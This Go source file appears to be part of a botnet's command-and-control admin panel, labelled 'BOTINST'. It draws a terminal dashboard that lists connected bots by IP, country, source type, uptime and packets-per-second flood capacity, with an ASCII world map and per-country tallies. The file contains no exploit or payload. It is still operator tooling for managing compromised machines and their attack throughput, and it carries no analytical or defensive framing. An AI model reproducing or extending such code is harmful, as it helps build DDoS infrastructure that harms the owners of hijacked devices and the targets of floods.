package main
import (
    "fmt"
    "sort"
    "strings"
    "time"
)
func (this *Admin) renderGeoMenu(scrollOffset int, sortBy string) {
    bots := clientList.GetBots()
    sortedBots := make([]*Bot, len(bots))
    copy(sortedBots, bots)
    switch sortBy {
    case "ip":
        sort.Slice(sortedBots, func(i, j int) bool {
            return sortedBots[i].GetIP() < sortedBots[j].GetIP()
        })
    case "country":
        sort.Slice(sortedBots, func(i, j int) bool {
            if sortedBots[i].country != sortedBots[j].country {
                return sortedBots[i].country < sortedBots[j].country
            }
            return sortedBots[i].GetIP() < sortedBots[j].GetIP()
        })
    case "pps":
        sort.Slice(sortedBots, func(i, j int) bool {
            return sortedBots[i].GetTotalPPS() > sortedBots[j].GetTotalPPS()
        })
    case "uptime":
        sort.Slice(sortedBots, func(i, j int) bool {
            return sortedBots[i].GetUptime() > sortedBots[j].GetUptime()
        })
    }
    countryStats := make(map[string]int)
    countryPPS := make(map[string]uint64)
    for _, bot := range sortedBots {
        countryStats[bot.country]++
        countryPPS[bot.country] += bot.GetTotalPPS()
    }
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[0m"))
    this.conn.Write([]byte("\x1b[1;31m"))
    this.conn.Write([]byte(" ██████╗  ██████╗ ████████╗██╗███╗   ██╗███████╗████████╗\r\n"))
    this.conn.Write([]byte(" ██╔══██╗██╔═══██╗╚══██╔══╝██║████╗  ██║██╔════╝╚══██╔══╝\r\n"))
    this.conn.Write([]byte(" ██████╔╝██║   ██║   ██║   ██║██╔██╗ ██║███████╗   ██║   \r\n"))
    this.conn.Write([]byte(" ██╔══██╗██║   ██║   ██║   ██║██║╚██╗██║╚════██║   ██║   \r\n"))
    this.conn.Write([]byte(" ██████╔╝╚██████╔╝   ██║   ██║██║ ╚████║███████║   ██║   \r\n"))
    this.conn.Write([]byte(" ╚═════╝  ╚═════╝    ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   \r\n"))
    this.conn.Write([]byte("\x1b[0m"))
    this.conn.Write([]byte("\x1b[1;32m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
    this.conn.Write([]byte("\x1b[1;32m║\x1b[1;31m                         NETWORK GEO VISUALIZATION                          \x1b[1;32m║\r\n"))
    this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
    totalPPS := uint64(0)
    for _, bot := range sortedBots {
        totalPPS += bot.GetTotalPPS()
    }
    this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32m║ \x1b[1;36mBOTS:\x1b[1;37m %-5d \x1b[1;36m│\x1b[0m \x1b[1;36mTOTAL PPS:\x1b[1;37m %-20s \x1b[1;32m║\r\n", 
        len(sortedBots), formatPPS(totalPPS))))
    this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
    this.renderWorldMap(sortedBots, countryStats)
    this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
    this.renderCountryDistribution(countryStats, countryPPS)
    this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
    this.renderBotList(sortedBots, scrollOffset, sortBy)
    this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
    this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33m[1]IP \x1b[0m[\x1b[1;33m2\x1b[0m]Country \x1b[1;33m[3]PPS \x1b[0m[\x1b[1;33m4\x1b[0m]Uptime \x1b[1;33m[J/K]Scroll \x1b[0m[\x1b[1;31mQ\x1b[0m]Quit \x1b[1;32m║\r\n"))
    this.conn.Write([]byte("\x1b[1;32m╚═══════════════════════════════════════════════════════════════════════════════╝\r\n"))
}
func (this *Admin) renderWorldMap(bots []*Bot, countryStats map[string]int) {
    mapWidth := 80
    mapHeight := 20
    worldMap := make([][]rune, mapHeight)
    for i := range worldMap {
        worldMap[i] = make([]rune, mapWidth)
        for j := range worldMap[i] {
            worldMap[i][j] = ' '
        }
    }
    for y := 8; y < 14; y++ {
        for x := 10; x < 25; x++ {
            if y >= 8 && y <= 13 && x >= 10 && x <= 24 {
                worldMap[y][x] = '▓'
            }
        }
    }
    for y := 14; y < 20; y++ {
        for x := 15; x < 22; x++ {
            if y >= 14 && y <= 19 && x >= 15 && x <= 21 {
                worldMap[y][x] = '▓'
            }
        }
    }
    for y := 6; y < 10; y++ {
        for x := 40; x < 48; x++ {
            if y >= 6 && y <= 9 && x >= 40 && x <= 47 {
                worldMap[y][x] = '▓'
            }
        }
    }
    for y := 6; y < 14; y++ {
        for x := 55; x < 75; x++ {
            if y >= 6 && y <= 13 && x >= 55 && x <= 74 {
                worldMap[y][x] = '▓'
            }
        }
    }
    for y := 12; y < 18; y++ {
        for x := 45; x < 52; x++ {
            if y >= 12 && y <= 17 && x >= 45 && x <= 51 {
                worldMap[y][x] = '▓'
            }
        }
    }
    for y := 16; y < 19; y++ {
        for x := 62; x < 68; x++ {
            if y >= 16 && y <= 18 && x >= 62 && x <= 67 {
                worldMap[y][x] = '▓'
            }
        }
    }
    botPositions := make(map[string]int)
    for _, bot := range bots {
        x := bot.geoX
        y := bot.geoY
        if x >= 0 && x < mapWidth && y >= 0 && y < mapHeight {
            key := fmt.Sprintf("%d,%d", x, y)
            count := botPositions[key]
            botPositions[key] = count + 1
            var symbol rune
            if count == 0 {
                symbol = '●'
            } else if count == 1 {
                symbol = '◆'
            } else if count == 2 {
                symbol = '■'
            } else {
                symbol = '▲'
            }
            worldMap[y][x] = symbol
        }
    }
    this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;36mWORLD MAP:\x1b[0m                                                                 \x1b[1;32m║\r\n"))
    for y := 0; y < mapHeight; y++ {
        line := "\x1b[1;32m║ \x1b[0m"
        for x := 0; x < mapWidth; x++ {
            char := worldMap[y][x]
            if char == '●' || char == '◆' || char == '■' || char == '▲' {
                line += fmt.Sprintf("\x1b[1;31m%c\x1b[0m", char)
            } else if char == '▓' {
                line += fmt.Sprintf("\x1b[0;37m%c\x1b[0m", char)
            } else {
                line += " "
            }
        }
        line += " \x1b[1;32m║\r\n"
        this.conn.Write([]byte(line))
    }
    this.conn.Write([]byte("\x1b[1;32m║ \x1b[0mLegend: \x1b[0;37m▓\x1b[0m=Land \x1b[1;31m●\x1b[0m=Bot(1) \x1b[1;31m◆\x1b[0m=Bot(2) \x1b[1;31m■\x1b[0m=Bot(3+) \x1b[1;31m▲\x1b[0m=Bot(4+)                                 \x1b[1;32m║\r\n"))
}
func (this *Admin) renderCountryDistribution(countryStats map[string]int, countryPPS map[string]uint64) {
    type countryEntry struct {
        code  string
        name  string
        count int
        pps   uint64
    }
    countries := make([]countryEntry, 0, len(countryStats))
    for code, count := range countryStats {
        countries = append(countries, countryEntry{
            code:  code,
            name:  getCountryName(code),
            count: count,
            pps:   countryPPS[code],
        })
    }
    sort.Slice(countries, func(i, j int) bool {
        return countries[i].count > countries[j].count
    })
    this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;36mTOP COUNTRIES:\x1b[0m                                                                    \x1b[1;32m║\r\n"))
    maxBots := 0
    for _, c := range countries {
        if c.count > maxBots {
            maxBots = c.count
        }
    }
    topCount := 10
    if len(countries) < topCount {
        topCount = len(countries)
    }
    for i := 0; i < topCount; i++ {
        c := countries[i]
        barWidth := 35
        barFill := int(float64(c.count) / float64(maxBots) * float64(barWidth))
        if barFill > barWidth {
            barFill = barWidth
        }
        bar := strings.Repeat("\x1b[1;31m█\x1b[0m", barFill) + strings.Repeat("\x1b[0;30m░\x1b[0m", barWidth-barFill)
        this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32m║ \x1b[1;33m%-3s\x1b[0m %-18s \x1b[1;32m%3d\x1b[0m bots [%s] \x1b[1;36mPPS: %s\x1b[0m \x1b[1;32m║\r\n",
            c.code, c.name, c.count, bar, formatPPS(c.pps))))
    }
}
func (this *Admin) renderBotList(bots []*Bot, scrollOffset int, sortBy string) {
    pageSize := 10
    totalPages := (len(bots) + pageSize - 1) / pageSize
    if scrollOffset < 0 {
        scrollOffset = 0
    }
    if scrollOffset >= totalPages {
        scrollOffset = totalPages - 1
    }
    startIdx := scrollOffset * pageSize
    endIdx := startIdx + pageSize
    if endIdx > len(bots) {
        endIdx = len(bots)
    }
    this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32m║ \x1b[1;36mBOT LIST [%s] - PAGE %d/%d:\x1b[0m                                                    \x1b[1;32m║\r\n", 
        strings.ToUpper(sortBy), scrollOffset+1, totalPages)))
    this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33mIP\x1b[0m              \x1b[1;33mCNTRY\x1b[0m  \x1b[1;33mTYPE\x1b[0m    \x1b[1;33mPPS\x1b[0m         \x1b[1;33mUPTIME\x1b[0m      \x1b[1;32m║\r\n"))
    for i := startIdx; i < endIdx; i++ {
        bot := bots[i]
        ip := bot.GetIP()
        if len(ip) > 15 {
            ip = ip[:12] + "..."
        }
        uptime := bot.GetUptime()
        uptimeStr := formatDuration(uptime)
        this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32m║ \x1b[1;37m%-15s \x1b[1;32m%-6s\x1b[0m \x1b[1;35m%-8s\x1b[0m \x1b[1;36m%-12s\x1b[0m \x1b[1;33m%-12s\x1b[0m \x1b[1;32m║\r\n",
            ip, bot.country, bot.source, formatPPS(bot.GetTotalPPS()), uptimeStr)))
    }
    if len(bots) == 0 {
        this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;31mNO BOTS CONNECTED\x1b[0m                                                              \x1b[1;32m║\r\n"))
    }
}
func formatDuration(d time.Duration) string {
    if d < time.Minute {
        return fmt.Sprintf("%ds", int(d.Seconds()))
    } else if d < time.Hour {
        return fmt.Sprintf("%dm%ds", int(d.Minutes()), int(d.Seconds())%60)
    } else if d < 24*time.Hour {
        hours := int(d.Hours())
        minutes := int(d.Minutes()) % 60
        return fmt.Sprintf("%dh%dm", hours, minutes)
    } else {
        days := int(d.Hours() / 24)
        hours := int(d.Hours()) % 24
        return fmt.Sprintf("%dd%dh", days, hours)
    }
}
func (this *Admin) handleGeoMenu() {
    this.conn.Write([]byte("\033[2J\033[1H"))
    scrollOffset := 0
    sortBy := "ip"
    ticker := time.NewTicker(2 * time.Second)
    defer ticker.Stop()
    this.renderGeoMenu(scrollOffset, sortBy)
    for {
        select {
        case <-ticker.C:
            this.renderGeoMenu(scrollOffset, sortBy)
        default:
            this.conn.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
            buf := make([]byte, 1)
            n, err := this.conn.Read(buf)
            if err != nil || n == 0 {
                continue
            }
            key := buf[0]
            if key == 'q' || key == 'Q' {
                this.conn.Write([]byte("\033[2J\033[1H"))
                return
            } else if key == 'j' || key == 'J' {
                scrollOffset++
                this.renderGeoMenu(scrollOffset, sortBy)
            } else if key == 'k' || key == 'K' {
                if scrollOffset > 0 {
                    scrollOffset--
                    this.renderGeoMenu(scrollOffset, sortBy)
                }
            } else if key == '1' {
                sortBy = "ip"
                scrollOffset = 0
                this.renderGeoMenu(scrollOffset, sortBy)
            } else if key == '2' {
                sortBy = "country"
                scrollOffset = 0
                this.renderGeoMenu(scrollOffset, sortBy)
            } else if key == '3' {
                sortBy = "pps"
                scrollOffset = 0
                this.renderGeoMenu(scrollOffset, sortBy)
            } else if key == '4' {
                sortBy = "uptime"
                scrollOffset = 0
                this.renderGeoMenu(scrollOffset, sortBy)
            } else if key == 27 {
                arrowBuf := make([]byte, 2)
                n, _ := this.conn.Read(arrowBuf)
                if n == 2 && arrowBuf[0] == '[' {
                    if arrowBuf[1] == 'A' {
                        if scrollOffset > 0 {
                            scrollOffset--
                            this.renderGeoMenu(scrollOffset, sortBy)
                        }
                    } else if arrowBuf[1] == 'B' {
                        scrollOffset++
                        this.renderGeoMenu(scrollOffset, sortBy)
                    }
                }
            }
        }
    }
}
